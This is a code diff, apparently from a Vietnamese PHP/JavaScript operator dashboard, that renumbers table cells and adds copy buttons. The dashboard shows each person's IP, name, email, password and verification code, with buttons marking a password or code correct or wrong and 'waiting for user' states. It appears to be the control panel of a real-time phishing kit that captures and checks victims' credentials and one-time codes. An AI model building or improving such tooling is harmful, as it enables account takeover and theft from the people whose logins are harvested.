@@ -628,12 +628,12 @@ $domain_socket = file_get_contents('../domain_name.txt');
 
                 const cell0 = row.insertCell(0);
                 const cell1 = row.insertCell(1);
-                const cell7 = row.insertCell(2);
-                const cell2 = row.insertCell(3);
-                const cell3 = row.insertCell(4);
-                const cell4 = row.insertCell(5);
-                const cell5 = row.insertCell(6);
-                const cell6 = row.insertCell(7);
+                const cell2 = row.insertCell(2);
+                const cell3 = row.insertCell(3);
+                const cell4 = row.insertCell(4);
+                const cell5 = row.insertCell(5);
+                const cell6 = row.insertCell(6);
+                const cell7 = row.insertCell(7);
 
 
                 cell0.innerHTML = `<span class="order-id">
@@ -643,36 +643,36 @@ $domain_socket = file_get_contents('../domain_name.txt');
                 cell1.innerHTML = `<span class="order-id">#${data.order_id}</span>`;
                 cell1.style.color = colorText;
 
-                cell7.innerHTML = `<span class="ip">#${data.ip}</span>`;
+                cell2.innerHTML = `<span class="ip">#${data.ip}</span>`;
 
-                cell2.innerHTML = `
+                cell3.innerHTML = `
                     <div class="order-info">
                         <span class="order-name">${data.user_info.name}</span>
                     </div>
                 `;
-                cell3.innerHTML = `
+                cell4.innerHTML = `
                     <div class="order-info">
                         <span class="order-email">${data.user_info.email}</span>
                     </div>
                 `;
-                cell4.innerHTML = `
+                cell5.innerHTML = `
                     <div class="order-info">
                         <span class="order-password">${data.user_info.password}</span>
                     </div>
                 `;
-                cell5.innerHTML = `
+                cell6.innerHTML = `
                     <div class="order-info">
                         <span class="order-code">${data.user_info.code}</span>
                     </div>
                 `;
-                cell6.innerHTML = `
+                cell7.innerHTML = `
                     <button class="approve-btn" id="approve-btn-${data.order_id}">
                         <i class="fas fa-check"></i> Đơn mới
                     </button>
                 `;
 
                 // Thêm nút sao chép cho các ô
-                [cell1, cell2, cell3, cell4, cell5, cell7].forEach(addCopyButton);
+                [cell1, cell2, cell3, cell4, cell5, cell6].forEach(addCopyButton);
 
                 orders[data.order_id] = data;
 
@@ -694,12 +694,12 @@ $domain_socket = file_get_contents('../domain_name.txt');
 
             const cell0 = newRow.insertCell(0);
             const cell1 = newRow.insertCell(1);
-            const cell7 = newRow.insertCell(2);
-            const cell2 = newRow.insertCell(3);
-            const cell3 = newRow.insertCell(4);
-            const cell4 = newRow.insertCell(5);
-            const cell5 = newRow.insertCell(6);
-            const cell6 = newRow.insertCell(7);
+            const cell2 = newRow.insertCell(2);
+            const cell3 = newRow.insertCell(3);
+            const cell4 = newRow.insertCell(4);
+            const cell5 = newRow.insertCell(5);
+            const cell6 = newRow.insertCell(6);
+            const cell7 = newRow.insertCell(7);
 
             const colorText = order.colorText ?? "#000";
             cell0.innerHTML = `<span class="order-id">
@@ -709,23 +709,23 @@ $domain_socket = file_get_contents('../domain_name.txt');
             cell1.innerHTML = `<span class="order-id">#${orderId}</span>`;
             cell1.style.color = colorText;
 
-            cell7.innerHTML = `<span class="ip">#${data.user_info.ip}</span>`;
-            cell2.innerHTML = `
+            cell2.innerHTML = `<span class="ip">#${data.user_info.ip}</span>`;
+            cell3.innerHTML = `
                 <div class="order-info">
                     <span class="order-name">${data.user_info.name}</span>
                 </div>
             `;
-            cell3.innerHTML = `
+            cell4.innerHTML = `
                 <div class="order-info">
                     <span class="order-email">${data.user_info.email}</span>
                 </div>
             `;
-            cell4.innerHTML = `
+            cell5.innerHTML = `
                 <div class="order-info">
                     <span class="order-password">${data.user_info.password}</span>
                 </div>
             `;
-            cell5.innerHTML = `
+            cell6.innerHTML = `
                 <div class="order-info">
                     <span class="order-code">${data.user_info.code}</span>
                 </div>
@@ -736,7 +736,7 @@ $domain_socket = file_get_contents('../domain_name.txt');
                 approveBtn.remove();
             }
 
-            cell6.innerHTML = `
+            cell7.innerHTML = `
                 <button id="approve-pw-btn-${orderId}" class="approve-btn approve-pw-btn-${orderId}" onclick="passPassword('${orderId}', '${data.user_info.password}')">
                     <i class="fas fa-check"></i> Đúng PW
                 </button>
@@ -744,6 +744,9 @@ $domain_socket = file_get_contents('../domain_name.txt');
                     <i class="fas fa-times"></i> Sai PW
                 </button>
             `;
+
+            // Thêm nút sao chép cho các ô
+            [cell1, cell2, cell3, cell4, cell5, cell6].forEach(addCopyButton);
         }
 
         function step3(data) {
@@ -760,12 +763,12 @@ $domain_socket = file_get_contents('../domain_name.txt');
 
             const cell0 = newRow.insertCell(0);
             const cell1 = newRow.insertCell(1);
-            const cell7 = newRow.insertCell(2);
-            const cell2 = newRow.insertCell(3);
-            const cell3 = newRow.insertCell(4);
-            const cell4 = newRow.insertCell(5);
-            const cell5 = newRow.insertCell(6);
-            const cell6 = newRow.insertCell(7);
+            const cell2 = newRow.insertCell(2);
+            const cell3 = newRow.insertCell(3);
+            const cell4 = newRow.insertCell(4);
+            const cell5 = newRow.insertCell(5);
+            const cell6 = newRow.insertCell(6);
+            const cell7 = newRow.insertCell(7);
 
             const colorText = order.colorText;
             cell0.innerHTML = `<span class="order-id">
@@ -775,24 +778,24 @@ $domain_socket = file_get_contents('../domain_name.txt');
             cell1.innerHTML = `<span class="order-id">#${orderId}</span>`;
             cell1.style.color = colorText;
 
-            cell7.innerHTML = `<span class="ip">#${data.user_info.ip}</span>`;
+            cell2.innerHTML = `<span class="ip">#${data.user_info.ip}</span>`;
 
-            cell2.innerHTML = `
+            cell3.innerHTML = `
                 <div class="order-info">
                     <span class="order-name">${data.user_info.name}</span>
                 </div>
             `;
-            cell3.innerHTML = `
+            cell4.innerHTML = `
                 <div class="order-info">
                     <span class="order-email">${data.user_info.email}</span>
                 </div>
             `;
-            cell4.innerHTML = `
+            cell5.innerHTML = `
                 <div class="order-info">
                     <span class="order-password">${data.user_info.password}</span>
                 </div>
             `;
-            cell5.innerHTML = `
+            cell6.innerHTML = `
                 <div class="order-info">
                     <span class="order-code">${data.user_info.code}</span>
                 </div>
@@ -808,7 +811,7 @@ $domain_socket = file_get_contents('../domain_name.txt');
                 approveCodeBtn.remove();
             }
 
-            cell6.innerHTML = `
+            cell7.innerHTML = `
                 <button id="approve-code-btn-${orderId}" class="approve-btn approve-code-btn-${orderId}" onclick="passCode('${orderId}', '${data.user_info.code}')">
                     <i class="fas fa-check"></i> Đúng Code
                 </button>
@@ -816,6 +819,9 @@ $domain_socket = file_get_contents('../domain_name.txt');
                     <i class="fas fa-times"></i> Sai Code
                 </button>
             `;
+
+            // Thêm nút sao chép cho các ô
+            [cell1, cell2, cell3, cell4, cell5, cell6].forEach(addCopyButton);
         }
 
 
@@ -949,12 +955,12 @@ $domain_socket = file_get_contents('../domain_name.txt');
 
                 const cell0 = row.insertCell(0);
                 const cell1 = row.insertCell(1);
-                const cell7 = row.insertCell(2);
-                const cell2 = row.insertCell(3);
-                const cell3 = row.insertCell(4);
-                const cell4 = row.insertCell(5);
-                const cell5 = row.insertCell(6);
-                const cell6 = row.insertCell(7);
+                const cell2 = row.insertCell(2);
+                const cell3 = row.insertCell(3);
+                const cell4 = row.insertCell(4);
+                const cell5 = row.insertCell(5);
+                const cell6 = row.insertCell(6);
+                const cell7 = row.insertCell(7);
 
                 const colorText = order.colorText;
                 cell0.innerHTML = `<span class="order-id">
@@ -964,24 +970,24 @@ $domain_socket = file_get_contents('../domain_name.txt');
                 cell1.innerHTML = `<span class="order-id">#${orderId}</span>`;
                 cell1.style.color = colorText;
 
-                cell7.innerHTML = `<span class="ip">#${order.user_info.ip || 'Không xác định'}</span>`;
+                cell2.innerHTML = `<span class="ip">#${order.user_info.ip || 'Không xác định'}</span>`;
 
-                cell2.innerHTML = `
+                cell3.innerHTML = `
                     <div class="order-info">
                         <span class="order-name">${order.user_info.name}</span>
                     </div>
                 `;
-                cell3.innerHTML = `
+                cell4.innerHTML = `
                     <div class="order-info">
                         <span class="order-email">${order.user_info.email}</span>
                     </div>
                 `;
-                cell4.innerHTML = `
+                cell5.innerHTML = `
                     <div class="order-info">
                         <span class="order-password">${order.user_info.password}</span>
                     </div>
                 `;
-                cell5.innerHTML = `
+                cell6.innerHTML = `
                     <div class="order-info">
                         <span class="order-code">${order.user_info.code}</span>
                     </div>
@@ -989,31 +995,31 @@ $domain_socket = file_get_contents('../domain_name.txt');
                 
                 if (order.step == 1) {
                     if (order.user_info.password !== "") {
-                        cell6.innerHTML = `
+                        cell7.innerHTML = `
                             <button class="approve-btn">
                                 <i class="fas fa-eye"></i> Đợi user
                             </button>
                         `;
                     } else {
-                        cell6.innerHTML = `
+                        cell7.innerHTML = `
                             <button class="approve-btn"> Đợi PW
                             </button>
                         `;
                     }
                 } else if (order.step == 2) {
                     if (order.user_info.code !== "") {
-                        cell6.innerHTML = `
+                        cell7.innerHTML = `
                             <button class="approve-btn">
                                 <i class="fas fa-eye"></i> Đợi user
                             </button>
                         `;
                     } else {
-                        cell6.innerHTML = `
+                        cell7.innerHTML = `
                             <button class="approve-btn"> Đợi Code </button>
                         `;
                     }
                 } else {
-                    cell6.innerHTML = `
+                    cell7.innerHTML = `
                         <button class="approve-btn">
                             <i class="fas fa-check"></i> Xong
                         </button>
@@ -1021,7 +1027,7 @@ $domain_socket = file_get_contents('../domain_name.txt');
                 }
 
                 // Thêm nút sao chép cho các ô
-                [cell1, cell2, cell3, cell4, cell5, cell7].forEach(addCopyButton);
+                [cell1, cell2, cell3, cell4, cell5, cell6].forEach(addCopyButton);
             }
         }
 
